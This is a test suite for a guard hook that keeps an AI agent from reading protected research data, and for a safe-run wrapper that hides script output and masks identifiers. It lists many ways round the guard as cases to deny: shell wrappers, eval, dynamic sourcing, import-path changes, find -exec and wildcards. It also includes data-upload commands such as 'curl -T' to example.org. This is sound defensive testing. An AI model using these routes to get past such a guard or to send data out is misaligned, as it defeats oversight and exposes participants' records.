import { describe, expect, test } from "bun:test"
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, renameSync, rmSync, statSync, utimesSync, writeFileSync } from "fs"
import os from "os"
import path from "path"
import { APPROVED, SCHEMA_ONLY, bash, expectAll, guard, helper, pluginRoot, project, py, runGuard, tempDir, tempRoots, verdicts } from "./data-boundary-harness"

const safeRun = path.join(pluginRoot, "scripts", "method-safe-run")
const indexer = path.join(pluginRoot, "scripts", "method-identifier-index")
function buildIndex(cwd: string, ...args: string[]) {
  const proc = Bun.spawnSync([indexer, ...args], { cwd })
  return { code: proc.exitCode, out: proc.stdout.toString() + proc.stderr.toString() }
}
const indexPath = (root: string) => path.join(root, ".methodsmith", "identifier-index.local.json")
function runSafe(cwd: string, ...cmd: string[]) {
  const proc = Bun.spawnSync([safeRun, "--", ...cmd], { cwd })
  return { code: proc.exitCode, out: proc.stdout.toString() + proc.stderr.toString() }
}

function withFile(root: string, rel: string, content: string) {
  mkdirSync(path.dirname(path.join(root, rel)), { recursive: true })
  writeFileSync(path.join(root, rel), content)
  return root
}

// Aggregate table: no identifier headers, no counts from 1 to 10.
export const AGGREGATE_CSV = "group,n,percent\nexposed,120,40.0\nunexposed,180,60.0\nmissing,0,0.0\n"

describe("limit 1a: agent-written scripts that read data (schema-only)", () => {
  test("running a script file that reads a data file is denied", () => {
    const root = withFile(project(SCHEMA_ONLY), "analysis/peek.py", "import pandas as pd\nprint(pd.read_csv('data/cohort.csv').head())\n")
    expectAll(root, "deny", [["Bash", bash("python3 analysis/peek.py")]])
  })

  test("a read call on a variable path counts as reading data, in Python and R", () => {
    const root = project(SCHEMA_ONLY)
    withFile(root, "analysis/argv.py", "import sys, pandas as pd\ndf = pd.read_csv(sys.argv[1])\nprint(df)\n")
    withFile(root, "analysis/argv.R", "args <- commandArgs(TRUE)\nd <- data.table::fread(args[1])\nprint(d)\n")
    withFile(root, "analysis/rds.R", "x <- readRDS(path)\nprint(x)\n")
    expectAll(root, "deny", [
      ["Bash", bash("python3 analysis/argv.py somewhere/x")],
      ["Bash", bash("Rscript analysis/argv.R somewhere/x")],
      ["Bash", bash("Rscript analysis/rds.R")],
    ])
  })

  test("shell scripts, Quarto documents, and executed notebooks are scanned the same way", () => {
    const root = project(SCHEMA_ONLY)
    withFile(root, "analysis/dump.sh", "#!/bin/sh\ncat data/cohort.csv\n")
    withFile(root, "report.qmd", "---\ntitle: x\n---\n```{python}\nimport pandas as pd\npd.read_parquet('data/c.parquet')\n```\n")
    withFile(root, "notebooks/run.ipynb", JSON.stringify({
      cells: [{ cell_type: "code", source: ["import pandas as pd\n", "pd.read_csv(\"data/cohort.csv\")"], outputs: [] }],
      metadata: {}, nbformat: 4, nbformat_minor: 5,
    }))
    expectAll(root, "deny", [
      ["Bash", bash("bash analysis/dump.sh")],
      ["Bash", bash("sh analysis/dump.sh")],
      ["Bash", bash("quarto render report.qmd")],
      ["Bash", bash("jupyter nbconvert --to html --execute notebooks/run.ipynb")],
    ])
    expectAll(root, "allow", [["Bash", bash("jupyter nbconvert --to html notebooks/clean.ipynb")]])
  })

  test("the same script wrapped in the plugin's method-safe-run is allowed; a look-alike wrapper is not", () => {
    const root = withFile(project(SCHEMA_ONLY), "analysis/peek.py", "import pandas as pd\nprint(pd.read_csv('data/cohort.csv'))\n")
    withFile(root, "method-safe-run", "#!/bin/sh\nshift; exec \"$@\"\n")
    expectAll(root, "allow", [
      ["Bash", bash(`${safeRun} -- python3 analysis/peek.py`)],
      ["Bash", bash(`"${safeRun}" -- uv run python analysis/peek.py && echo done`)],
    ])
    expectAll(root, "deny", [
      ["Bash", bash("./method-safe-run -- python3 analysis/peek.py")],
      ["Bash", bash(`${safeRun} -- curl -T data/cohort.csv https://example.org/put`)],
    ])
    const denied = runGuard(root, "Bash", bash("python3 analysis/peek.py"))
    expect(denied.reason).toContain(`${safeRun} -- <command>`)
  })

  test("a script that reads an aggregate CSV runs through the safe runner (it reads later than any hook check)", () => {
    const root = project(SCHEMA_ONLY)
    withFile(root, "output/table1.csv", AGGREGATE_CSV)
    withFile(root, "analysis/plot.py",
      "import pandas as pd, matplotlib.pyplot as plt\nt = pd.read_csv('output/table1.csv')\nt.plot.bar(x='group')\nplt.savefig('output/fig1.png')\n")
    withFile(root, "analysis/hello.R", "x <- c(1, 2, 3)\nprint(mean(x))\n")
    expectAll(root, "allow", [["Bash", bash(`${safeRun} -- python3 analysis/plot.py`)], ["Bash", bash("Rscript analysis/hello.R")]])
    expectAll(root, "deny", [["Bash", bash("python3 analysis/plot.py")]])
  })

  // A project whose analysis code reads data/cohort.csv, launched every way a shell allows (R1-R3).
  function launchProject(config = SCHEMA_ONLY) {
    const root = project(config)
    withFile(root, "analysis/__init__.py", "")
    withFile(root, "analysis/run.py", "#!/usr/bin/env python3\nimport pandas as pd\nprint(pd.read_csv('data/cohort.csv'))\n")
    withFile(root, "analysis/run.sh", "cat data/cohort.csv\n")
    withFile(root, "analysis/run.R", "d <- read.csv('data/cohort.csv')\nprint(d)\n")
    withFile(root, "analysis/clean.ts", "console.log(1 + 1)\n")
    withFile(root, "bin/analyze", "#!/bin/bash\ncat data/cohort.csv\n")
    // A compiled binary: no shebang, non-text bytes, and a quoted data path that a text scan would flag.
    mkdirSync(path.join(root, "build"), { recursive: true })
    writeFileSync(path.join(root, "build", "app"), Buffer.concat([
      Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0xff, 0xfe, 0x00]),
      Buffer.from("read_csv('data/cohort.csv')\0"), Buffer.from([0x89, 0x00, 0xc3]),
    ]))
    for (const rel of ["analysis/run.py", "analysis/run.sh", "bin/analyze", "build/app"]) chmodSync(path.join(root, rel), 0o755)
    return root
  }

  const LAUNCH_DENIES = [
    "uv run analysis/run.py", "uv run python analysis/run.py", "pdm run analysis/run.py",
    "uv run --directory analysis python run.py", "uv run --directory . python analysis/run.py",
    "./analysis/run.py", "analysis/run.sh", "./bin/analyze",
    "python3 - < analysis/run.py", "python3 < analysis/run.py", "cat analysis/run.py | python3",
    "source analysis/run.sh", ". analysis/run.sh",
    "python3 -m analysis.run", "PYTHONPATH=analysis python3 -m run",
    `Rscript -e "source('analysis/run.R')"`,
  ]
  const INNER_SHELL_DENIES = [`bash -c "python3 analysis/run.py"`, `sh -c "python3 analysis/run.py"`, `eval "python3 analysis/run.py"`]
  const WORKFLOW_DENIES = [
    "make", "make test", "make -C analysis", "snakemake", "pytest tests/", "python3 -m pytest", "dvc repro",
    `Rscript -e "targets::tar_make()"`, `Rscript -e "rmarkdown::render('report.Rmd')"`, "npm run analyze", "pnpm run analyze",
    "yarn analyze", "bun run analyze", "tox", "nox", "just", "papermill in.ipynb out.ipynb", "kedro run", "dbt run",
    "quarto render", "R CMD BATCH analysis/run.R",
  ]

  test("every launch shape of a script that reads data is scanned and denied (R1)", () => {
    const root = launchProject()
    expectAll(root, "deny", LAUNCH_DENIES.map((c) => ["Bash", bash(c)] as [string, Record<string, unknown>]))
  })

  test("code run through sh -c, bash -c, or eval is judged for access, except under the plugin's method-safe-run (R2)", () => {
    const root = launchProject()
    expectAll(root, "deny", INNER_SHELL_DENIES.map((c) => ["Bash", bash(c)] as [string, Record<string, unknown>]))
    expectAll(root, "allow", [["Bash", bash(`${safeRun} -- bash -c "python3 analysis/run.py"`)]])
  })

  test("workflow runners are denied in schema-only and allowed under method-safe-run (R3)", () => {
    const root = launchProject()
    expectAll(root, "deny", WORKFLOW_DENIES.map((c) => ["Bash", bash(c)] as [string, Record<string, unknown>]))
    expectAll(root, "allow", [["Bash", bash(`${safeRun} -- make`)], ["Bash", bash(`${safeRun} -- npm run analyze`)]])
    expect(runGuard(root, "Bash", bash("make test")).reason).toContain("method-safe-run -- make")
  })

  test("find -exec with a content reader over an unrestricted tree is denied; metadata and code-only finds pass", () => {
    const root = launchProject()
    expectAll(root, "deny", [
      ["Bash", bash("find . -type f -exec cat {} +")],
      ["Bash", bash("find . -type f -exec grep -h Zed {} +")],
      ["Bash", bash("find . -type f | xargs cat")],
    ])
    expectAll(root, "allow", [
      ["Bash", bash("find . -name x -exec ls -l {} +")],
      ["Bash", bash("find . -name '*.py' -exec cat {} +")],
      ["Bash", bash("find . -name '*.py'")],
      ["Bash", bash("find . -type f | xargs wc -l")],
    ])
  })

  test("negation or alternation in the find expression lifts the code-only limit", () => {
    const root = launchProject()
    expectAll(root, "deny", [
      ["Bash", bash("find . ! -name '*.py' -exec cat {} +")],
      ["Bash", bash("find . -not -name '*.py' -exec cat {} +")],
      ["Bash", bash("find . -name '*.py' -o -type f -exec cat {} +")],
      ["Bash", bash("find . -name '*.py' -or -type f -exec cat {} +")],
      ["Bash", bash("find . -type d -o -type f -exec cat {} +")],
      ["Bash", bash("find . ! -name '*.py' | xargs cat")],
    ])
    // An -o or ! inside the -exec command line is an argument of that command, not a find operator.
    expectAll(root, "allow", [["Bash", bash("find . -name '*.py' -exec grep -o import {} +")]])
  })

  test("a long shell script is scanned in linear time", () => {
    const root = launchProject()
    const lines = Array.from({ length: 20000 }, () => "echo ok")
    withFile(root, "analysis/big.sh", lines.join("\n") + "\n")
    const started = performance.now()
    expect(runGuard(root, "Bash", bash("bash analysis/big.sh")).decision).toBe("allow")
    expect(performance.now() - started).toBeLessThan(3000)
    lines.splice(19990, 0, "cat data/cohort.csv")
    withFile(root, "analysis/big-read.sh", lines.join("\n") + "\n")
    expect(runGuard(root, "Bash", bash("bash analysis/big-read.sh")).decision).toBe("deny")
  }, 120000)

  test("tools, unresolvable modules, compiled binaries, and clean scripts stay allowed", () => {
    const root = launchProject()
    expectAll(root, "allow", [
      ["Bash", bash("uv run ruff check .")],
      ["Bash", bash("python3 -m http.server")],
      ["Bash", bash("./build/app")],
      ["Bash", bash("bun run analysis/clean.ts")],
      ["Bash", bash("cat analysis/clean.ts | node")],
      ["Bash", bash("bun test")],
    ])
  })

  test("deny reasons for every launch shape carry no data values", () => {
    const root = launchProject()
    const commands = [...LAUNCH_DENIES, ...INNER_SHELL_DENIES, ...WORKFLOW_DENIES, "find . -type f -exec cat {} +"]
    const results = py(commands.map((c) => ({ fn: "classify" as const, call: { cwd: root, tool_name: "Bash", tool_input: bash(c) } })))
    for (const [i, result] of results.entries()) {
      const text = JSON.stringify(result)
      expect({ command: commands[i], denied: !!result, leaked: ["Zed", "Testperson", "FAKE0001"].some((v) => text.includes(v)) })
        .toEqual({ command: commands[i], denied: true, leaked: false })
    }
  })

  test("in an approved project the same launch shapes and workflow runners stay allowed", () => {
    const root = launchProject(APPROVED)
    expectAll(root, "allow", ["make test", "uv run analysis/run.py", "npm run analyze", "./analysis/run.py",
      "cat analysis/run.py | python3", `bash -c "python3 analysis/run.py"`, "python3 -m pytest", "find . -type f -exec cat {} +",
    ].map((c) => ["Bash", bash(c)] as [string, Record<string, unknown>]))
  })

  test("an interpreter given an extensionless script file scans it in the interpreter's language", () => {
    const root = launchProject()
    withFile(root, "bin/run", "import pandas as pd\nprint(pd.read_csv('data/cohort.csv'))\n")
    withFile(root, "bin/hello", "echo hello\n")
    withFile(root, "bin/greet", "print('hello')\n")
    expectAll(root, "deny", [["Bash", bash("bash bin/analyze")], ["Bash", bash("python3 bin/run")], ["Bash", bash("sh bin/analyze")]])
    expectAll(root, "allow", [["Bash", bash("bash bin/hello")], ["Bash", bash("python3 bin/greet")]])
    expectAll(launchProject(APPROVED), "allow", [["Bash", bash("bash bin/analyze")]])
  })

  test("ipython script operands and R -f / --file scripts are scanned", () => {
    const root = launchProject()
    withFile(root, "analysis/clean.R", "x <- c(1, 2, 3)\nprint(mean(x))\n")
    expectAll(root, "deny", [
      ["Bash", bash("ipython analysis/run.py")],
      ["Bash", bash("R -f analysis/run.R")],
      ["Bash", bash("R --file=analysis/run.R")],
      ["Bash", bash("R --vanilla --file analysis/run.R")],
    ])
    expectAll(root, "allow", [["Bash", bash("R --version")], ["Bash", bash("R -f analysis/clean.R")]])
    expectAll(launchProject(APPROVED), "allow", [["Bash", bash("ipython analysis/run.py")], ["Bash", bash("R -f analysis/run.R")]])
  })

  // Code that runs another file or module: literal targets are followed and scanned, the rest denied (R7, R8).
  function sourceProject(config = SCHEMA_ONLY) {
    const root = project(config)
    withFile(root, "R/x.R", "x <- c(1, 2, 3)\nprint(mean(x))\n")
    withFile(root, "R/bad.R", "d <- read.csv('data/cohort.csv')\nprint(d)\n")
    withFile(root, "s.py", "print(1 + 1)\n")
    withFile(root, "pkg/__init__.py", "")
    withFile(root, "pkg/ok.py", "print('ok')\n")
    withFile(root, "pkg/bad.py", "import pandas as pd\nprint(pd.read_csv('data/cohort.csv'))\n")
    mkdirSync(path.join(root, "sub"), { recursive: true })
    return root
  }
  const calls = (commands: string[]) => commands.map((c) => ["Bash", bash(c)] as [string, Record<string, unknown>])
  const DYNAMIC_SOURCE_DENIES = [
    `Rscript -e 'source(file.path("R","bad.R"))'`,
    `Rscript -e 'source(paste0("R/", step, ".R"))'`,
    `Rscript -e 'invisible(lapply(list.files("R", full.names=TRUE), source))'`,
    `Rscript -e 'f<-"R/x.R"' -e 'source(f)'`,
    `python3 -c "exec(open(p).read())"`,
    `Rscript -e 'sys.source(f)'`,
    `Rscript -e 'eval(parse(f))'`,
    `Rscript -e 'eval(parse(file = f))'`,
    `python3 -c "exec(compile(open(p).read(), p, 'exec'))"`,
    `python3 -c "import importlib; importlib.import_module(m)"`,
    `python3 -c "exec(Path(p).read_text())"`,
    `python3 -c "import runpy; runpy.run_module(name)"`,
    `python3 -c "import runpy; runpy.run_module('pkg.bad')"`,
    `Rscript -e 'source("R/missing.R")'`,
    `Rscript -e 'setwd("sub"); source("R/x.R")'`,
  ]

  test("inline code that runs a file whose target cannot be resolved, or reads data, is denied (R7, R8)", () => {
    const root = sourceProject()
    expectAll(root, "deny", calls(DYNAMIC_SOURCE_DENIES))
    const reason = runGuard(root, "Bash", bash(`Rscript -e 'source(paste0("R/", step, ".R"))'`)).reason
    expect(reason).toContain("method-safe-run")
    const results = py(DYNAMIC_SOURCE_DENIES.map((c) => ({ fn: "classify" as const, call: { cwd: root, tool_name: "Bash", tool_input: bash(c) } })))
    for (const [i, result] of results.entries()) {
      const text = JSON.stringify(result)
      expect({ command: DYNAMIC_SOURCE_DENIES[i], named: text.includes("method-safe-run"), leaked: ["Zed", "Testperson", "FAKE0001"].some((v) => text.includes(v)) })
        .toEqual({ command: DYNAMIC_SOURCE_DENIES[i], named: true, leaked: false })
    }
  })

  test("inline code that runs a statically resolvable clean file is followed and allowed (R8)", () => {
    const root = sourceProject()
    expectAll(root, "allow", calls([
      `Rscript -e 'source(file.path("R","x.R"))'`,
      `Rscript -e 'source(file="R/x.R")'`,
      `Rscript -e 'source(here::here("R","x.R"))'`,
      `python3 -c "import runpy; runpy.run_path('s.py')"`,
      `python3 -c "import runpy; runpy.run_module('pkg.ok')"`,
    ]))
  })

  test("scanned script files follow literal sourced scripts and deny unresolvable ones (R7, R8)", () => {
    const root = sourceProject()
    withFile(root, "analysis/count.R", "df <- data.frame(source = c('a', 'b', 'a'))\nprint(dplyr::count(df, source))\n")
    withFile(root, "analysis/main.R", "fs <- list.files('R', full.names = TRUE)\nfor (f in fs) source(f)\n")
    withFile(root, "analysis/follow-bad.R", "source(\"R/bad.R\")\n")
    withFile(root, "analysis/follow-ok.R", "source(\"R/x.R\")\n")
    expectAll(root, "allow", calls(["Rscript analysis/count.R", "Rscript analysis/follow-ok.R"]))
    expectAll(root, "deny", calls(["Rscript analysis/main.R", "Rscript analysis/follow-bad.R"]))
    expect(runGuard(root, "Bash", bash("Rscript analysis/main.R")).reason).toContain("method-safe-run")
  })

  test("extensionless and shebang scripts get the run-a-file check in the interpreter's or shebang's language", () => {
    const root = sourceProject()
    withFile(root, "analysis/runner", "#!/usr/bin/env python3\nimport runpy, sys\nrunpy.run_path(sys.argv[1])\n")
    withFile(root, "analysis/runall", "#!/usr/bin/env Rscript\nfs <- list.files('R', full.names = TRUE)\nfor (f in fs) source(f)\n")
    withFile(root, "analysis/plain", "import runpy\nrunpy.run_path('s.py')\n")
    chmodSync(path.join(root, "analysis", "runner"), 0o755)
    chmodSync(path.join(root, "analysis", "runall"), 0o755)
    expectAll(root, "deny", calls(["./analysis/runner x", "python3 analysis/runner x", "Rscript analysis/runall", "./analysis/runall"]))
    expectAll(root, "allow", calls(["python3 analysis/plain"]))
    expectAll(sourceProject(APPROVED), "allow", calls(["python3 s.py"]))
  })

  test("Python literals that start with f are literals, not f-strings", () => {
    const root = sourceProject()
    withFile(root, "features.py", "print('features')\n")
    expectAll(root, "allow", calls([
      `python3 -c "import runpy; runpy.run_path('features.py')"`,
      `python3 -c "__import__('functools')"`,
    ]))
    expectAll(root, "deny", calls([`python3 -c "import runpy; runpy.run_path(f'{x}.py')"`]))
  })

  test("R parse() of a file is followed, and str2expression/str2lang of computed text is denied", () => {
    const root = sourceProject()
    expectAll(root, "deny", calls([
      `Rscript -e 'for (e in parse("R/bad.R")) eval(e)'`,
      `Rscript -e 'lapply(parse("R/bad.R"), eval)'`,
      `Rscript -e 'eval(str2expression(readLines(f)))'`,
      `Rscript -e 'eval(str2lang(code))'`,
      `Rscript -e 'exprs <- parse(f); for (e in exprs) eval(e)'`,
    ]))
    expectAll(root, "allow", calls([
      `Rscript -e 'parse(text = "1 + 1")'`,
      `Rscript -e 'for (e in parse("R/x.R")) eval(e)'`,
      `Rscript -e 'eval(str2lang("1 + 1"))'`,
    ]))
  })

  test("an import path changed at run time makes an unresolved literal module name unresolvable", () => {
    const root = sourceProject()
    withFile(root, "lib/hidden.py", "import pandas as pd\nprint(pd.read_csv('data/cohort.csv'))\n")
    withFile(root, "analysis/load.py", "import sys, importlib\nsys.path.insert(0, 'lib')\nimportlib.import_module('hidden')\n")
    expectAll(root, "deny", calls([
      `python3 -c "import sys, importlib; sys.path.insert(0, 'lib'); importlib.import_module('hidden')"`,
      `python3 -c "import sys; sys.path.append('lib'); __import__('hidden')"`,
      `python3 -c "import sys, runpy; sys.path += ['lib']; runpy.run_module('hidden')"`,
      `python3 -c "import site, importlib; site.addsitedir('lib'); importlib.import_module('hidden')"`,
      `python3 -c "import os, importlib; os.environ['PYTHONPATH'] = 'lib'; importlib.import_module('hidden')"`,
      "python3 analysis/load.py",
    ]))
    expectAll(root, "allow", calls([
      `python3 -c "import importlib; importlib.import_module('numpy')"`,
      `python3 -c "import sys, importlib; sys.path.insert(0, 'lib'); importlib.import_module('pkg.ok')"`,
    ]))
  })

  test("unresolvable run-a-file code is allowed under the plugin's method-safe-run and in approved projects", () => {
    expectAll(sourceProject(), "allow", calls([`${safeRun} -- Rscript -e 'source(f)'`]))
    const approved = sourceProject(APPROVED)
    withFile(approved, "analysis/main.R", "fs <- list.files('R', full.names = TRUE)\nfor (f in fs) source(f)\n")
    expectAll(approved, "allow", calls([...DYNAMIC_SOURCE_DENIES.filter((c) => !c.includes("bad")), "Rscript analysis/main.R"]))
  })
})

describe("wildcards and find patterns (schema-only)", () => {
  // A derived table outside data_root: only expanding the wildcard shows it is data.
  function wildcardProject(config = SCHEMA_ONLY) {
    return withFile(project(config), "results/derived.csv", "record_id,score\nFAKE0001,0.5\n")
  }
  // Empty files, created in one Python process so large trees stay fast.
  function manyFiles(root: string, dir: string, count: number, ext = "txt") {
    const make = "import os, sys\nd = sys.argv[1]\nos.makedirs(d, exist_ok=True)\n" +
      "for i in range(int(sys.argv[2])):\n    open(os.path.join(d, f'f{i:06d}.' + sys.argv[3]), 'w').close()"
    expect(Bun.spawnSync(["python3", "-c", make, path.join(root, dir), String(count), ext]).exitCode).toBe(0)
  }
  const cmds = (list: string[]) => list.map((c) => ["Bash", bash(c)] as [string, Record<string, unknown>])

  test("an unquoted wildcard that expands to a data file is a data reference, from any directory", () => {
    expectAll(wildcardProject(), "deny", cmds([
      "cat results/derived.cs?", "head r*/derived.c*", "cd src && cat ../results/der*", "cat results/derived.[ct]sv",
    ]))
  })

  test("find over a pattern that can name data files feeds -exec and listed-file consumers", () => {
    expectAll(wildcardProject(), "deny", cmds([
      "find . -name 'derived.cs?' -exec cat {} +", "find . -name '*.cs?' | xargs cat",
      // A code -name beside a -path that can match a data file is not limited to code.
      "find . -name '*.py' -o -path '*.cs?' -exec cat {} +", "find . -name '*.py' -o -ipath '*/RESULTS/*.CS?' | xargs cat",
    ]))
  })

  test("quoted find patterns and code-only wildcards stay allowed", () => {
    expectAll(wildcardProject(), "allow", cmds([
      "find . -name 'derived.cs?'", "cat src/*.py", "ls results/*", "find . -type d -name 'sr?' -exec ls {} +",
    ]))
  })

  test("wildcards under data_root stay denied (regression guards)", () => {
    expectAll(wildcardProject(), "deny", cmds(["cat data/cohort.cs?", "cd data && cat cohort.cs?"]))
  })

  test("an expansion over the 256-match cap is data in schema-only access checks", () => {
    const root = wildcardProject()
    manyFiles(root, "many", 300)
    expectAll(root, "deny", cmds(["cat */*", "cat many/*"]))
    expectAll(root, "allow", cmds(["cat many/f0000*", "ls many/*", "wc -l many/*"]))
  }, 30000)

  test("in an approved project an over-cap upload of non-data files stays allowed; a data match is still egress", () => {
    const root = wildcardProject(APPROVED)
    manyFiles(root, "site", 300, "html")
    expectAll(root, "allow", cmds(["rsync -av site/* host:/www", "cat */*", "cat results/derived.cs?"]))
    const [upload] = verdicts(root, [["Bash", bash("rsync -av results/derived.cs? host:/www")]])
    expect(upload).toMatchObject({ decision: "deny", kind: "egress" })
  }, 30000)

  test("deny reasons for wildcard reads name no matched file or value", () => {
    const root = wildcardProject()
    for (const c of ["cat results/derived.cs?", "cd src && cat ../results/der*"]) {
      const result = runGuard(root, "Bash", bash(c))
      expect(result.decision).toBe("deny")
      for (const value of ["derived.csv", "FAKE0001"]) expect({ c, value, leaked: result.stdout.includes(value) }).toEqual({ c, value, leaked: false })
    }
  })

  test("a wildcard over a 100,000-file tree decides in under 3 seconds (R9)", () => {
    const root = wildcardProject()
    manyFiles(root, "big", 100000)
    for (const [command, decision] of [["cat big/*.txt", "deny"], ["ls big/f09*", "allow"]] as const) {
      const start = performance.now()
      const result = runGuard(root, "Bash", bash(command))
      const ms = performance.now() - start
      expect({ command, decision: result.decision, fast: ms < 3000 }).toEqual({ command, decision, fast: true })
    }
  }, 120000)

  test("many brace wildcards over a large tree share one scan budget and still decide fast", () => {
    const root = wildcardProject()
    const make = "import os, sys\nfor d in range(60):\n    p = os.path.join(sys.argv[1], f'd{d:02d}')\n    os.makedirs(p)\n" +
      "    for i in range(1000):\n        open(os.path.join(p, f'f{i:04d}.txt'), 'w').close()"
    expect(Bun.spawnSync(["python3", "-c", make, path.join(root, "tree")]).exitCode).toBe(0)
    // Ten wildcards of 64 brace variants each: with a per-pattern budget this scans tens of millions of entries.
    const options = Array.from({ length: 64 }, (_, i) => `q${String(i).padStart(2, "0")}`).join(",")
    const globs = "xyzwvutsrp".split("").map((p) => `tree/*/${p}{${options}}*`).join(" ")
    const start = performance.now()
    const result = runGuard(root, "Bash", bash(`ls ${globs}; cat data/cohort.csv`))
    const ms = performance.now() - start
    rmSync(path.join(root, "tree"), { recursive: true, force: true }) // here, not in the shared afterAll hook's time limit
    expect({ decision: result.decision, fast: ms < 5000 }).toEqual({ decision: "deny", fast: true })
    expectAll(project(APPROVED), "allow", cmds(["cat src/*.py"]))
  }, 120000)
})

describe("limit 1b: method-safe-run keeps script output out of the context", () => {
  test("a command killed by a signal exits 128 + the signal number", () => {
    const { code, out } = runSafe(project(SCHEMA_ONLY), "sh", "-c", "kill -TERM $$")
    expect(code).toBe(143)
    expect(out).toContain("exit code: 143")
  })

  test("runs the command, logs stdout and stderr locally, and prints only the exit code and log path", () => {
    const root = withFile(project(SCHEMA_ONLY), "analysis/leak.py",
      "import sys\nprint('Zed Testperson FAKE0001')\nprint('to stderr', file=sys.stderr)\nsys.exit(3)\n")
    const { code, out } = runSafe(root, "python3", "analysis/leak.py")
    expect(code).toBe(3)
    expect(out).toContain("exit code: 3")
    expect(out).not.toContain("Zed Testperson")
    expect(out).not.toContain("FAKE0001")
    const logs = readdirSync(path.join(root, ".methodsmith", "runs")).filter((f) => f.endsWith(".log"))
    expect(logs).toHaveLength(1)
    expect(logs[0]).toMatch(/^\d{8}T\d{6}Z-\d+\.log$/)
    expect(out).toContain(`.methodsmith/runs/${logs[0]}`)
    const log = readFileSync(path.join(root, ".methodsmith", "runs", logs[0]), "utf8")
    expect(log).toContain("Zed Testperson FAKE0001")
    expect(log).toContain("to stderr")
  })

  test("lists files created or modified under the project, with size and row count for tables", () => {
    const root = withFile(project(SCHEMA_ONLY), "analysis/t1.py",
      "import csv\nwith open('output/table1.csv', 'w', newline='') as f:\n    w = csv.writer(f)\n    w.writerow(['group', 'n'])\n" +
      "    w.writerows([['a', 120], ['b', 180]])\nopen('src/load.py', 'a').write('# touched\\n')\n")
    mkdirSync(path.join(root, "output"))
    const { code, out } = runSafe(root, "python3", "analysis/t1.py")
    expect(code).toBe(0)
    const size = readFileSync(path.join(root, "output", "table1.csv")).length
    expect(out).toContain(`created  output/table1.csv  ${size} bytes  2 rows`)
    expect(out).toMatch(/modified src\/load\.py  \d+ bytes/)
    expect(out).not.toMatch(/(created|modified)\s+\.methodsmith/)
  })

  test("prints a strict stderr tail: traceback frames and exception type names only, plus a withheld count", () => {
    const root = withFile(project(SCHEMA_ONLY), "analysis/boom.py",
      "import sys\nfor i in range(40):\n    print(f'noise {i}', file=sys.stderr)\n" +
      "print('contact zed.t@example.com or (312) 555-0142, ssn 123-45-6789, id 00123456', file=sys.stderr)\n" +
      "rows = {'Zed Testperson': 1}\nrows['Yan Testperson']\n")
    const { code, out } = runSafe(root, "python3", "analysis/boom.py")
    expect(code).toBe(1)
    const tail = out.slice(out.indexOf("stderr (last 30 lines"))
    expect(tail).toContain('File "')
    expect(tail).toContain("analysis/boom.py\", line 6, in <module>")
    expect(tail).toContain("  KeyError\n")
    expect(tail).not.toContain("KeyError:")
    expect(tail).toMatch(/\d+ lines? withheld; full stderr in \.methodsmith\/runs\/\S+\.log/)
    expect(tail).not.toContain("noise")
    expect(tail).not.toContain("contact")
    for (const value of ["Testperson", "zed.t@example.com", "555-0142", "123-45-6789", "00123456"]) {
      expect({ value, leaked: out.includes(value) }).toEqual({ value, leaked: false })
    }
  })

  test("the run log directory is gitignored, and an existing ignore rule is not duplicated", () => {
    const root = project(SCHEMA_ONLY, { git: "real" })
    writeFileSync(path.join(root, ".gitignore"), "node_modules/\n")
    runSafe(root, "true")
    runSafe(root, "true")
    const ignore = readFileSync(path.join(root, ".gitignore"), "utf8")
    expect(ignore.split("\n").filter((l) => l === ".methodsmith/runs/")).toHaveLength(1)
    expect(ignore).toStartWith("node_modules/\n")
    expect(Bun.spawnSync(["git", "check-ignore", "-q", ".methodsmith/runs/x.log"], { cwd: root }).exitCode).toBe(0)
    const covered = project(SCHEMA_ONLY, { git: "real" })
    writeFileSync(path.join(covered, ".gitignore"), ".methodsmith/\n")
    runSafe(covered, "true")
    expect(readFileSync(path.join(covered, ".gitignore"), "utf8")).toBe(".methodsmith/\n")
  })

  test("reduces R-style error lines to their type and masks identifier-index hits in reported file names", () => {
    const root = withFile(project(SCHEMA_ONLY), "analysis/r_style.py",
      "import sys\nopen('output_zed_testperson.txt', 'w').write('x')\n" +
      "print('Error in lookup: Zed Testperson not found; record FAKE0002 skipped; Testperson alone is fine', file=sys.stderr)\n")
    expect(buildIndex(root).code).toBe(0)
    const { out } = runSafe(root, "python3", "analysis/r_style.py")
    expect(out).toContain("  Error in\n")
    expect(out).toMatch(/created  output_\[masked\]\.txt  1 bytes/)
    for (const value of ["zed", "Zed", "Testperson", "FAKE0002", "lookup", "not found"]) {
      expect({ value, leaked: out.includes(value) }).toEqual({ value, leaked: false })
    }
  })

  test("free-text stderr lines are withheld: only the exception type name and a count are printed", () => {
    const root = withFile(project(SCHEMA_ONLY), "analysis/msg.py",
      "import sys\nsys.stderr.write(\"KeyError: 'Zed Testperson'\\nSynth Person, diabetes, age 67\\n\")\n")
    const { code, out } = runSafe(root, "python3", "analysis/msg.py")
    expect(code).toBe(0)
    const log = readdirSync(path.join(root, ".methodsmith", "runs")).find((f) => f.endsWith(".log"))!
    const shown = out.replaceAll(log, "<log>")
    expect(shown).toContain("  KeyError\n")
    expect(shown).toMatch(/1 line withheld; full stderr in \.methodsmith\/runs\/<log>/)
    for (const value of ["Zed", "Testperson", "diabetes", "67", "Synth"]) {
      expect({ value, leaked: shown.includes(value) }).toEqual({ value, leaked: false })
    }
    expect(readFileSync(path.join(root, ".methodsmith", "runs", log), "utf8")).toContain("Synth Person, diabetes, age 67")
  })

  test("a traceback frame for a real project file keeps its path and line number", () => {
    const root = withFile(project(SCHEMA_ONLY), "src/deep/fail_here.py", "def go():\n    raise ValueError('Zed Testperson')\n")
    withFile(root, "analysis/call.py", "import sys\nsys.path.insert(0, 'src/deep')\nimport fail_here\nfail_here.go()\n")
    const { code, out } = runSafe(root, "python3", "analysis/call.py")
    expect(code).toBe(1)
    expect(out).toContain('analysis/call.py", line 4, in <module>')
    expect(out).toContain('src/deep/fail_here.py", line 2, in go')
    expect(out).toContain("  ValueError\n")
    expect(out).not.toContain("Testperson")
  })

  // More files than the pre-run snapshot holds (MAX_FILES = 20000), all at the root so the walk is
  // capped before it reaches results/.
  function bigProject() {
    const root = project(SCHEMA_ONLY)
    for (let i = 0; i <= 20000; i++) writeFileSync(path.join(root, `f${String(i).padStart(5, "0")}.txt`), "")
    mkdirSync(path.join(root, "results"))
    writeFileSync(path.join(root, "results", "untouched.txt"), "synthetic note\n")
    return root
  }

  test("in a project larger than the snapshot cap, a file the run writes is still recorded and becomes data", () => {
    const root = bigProject()
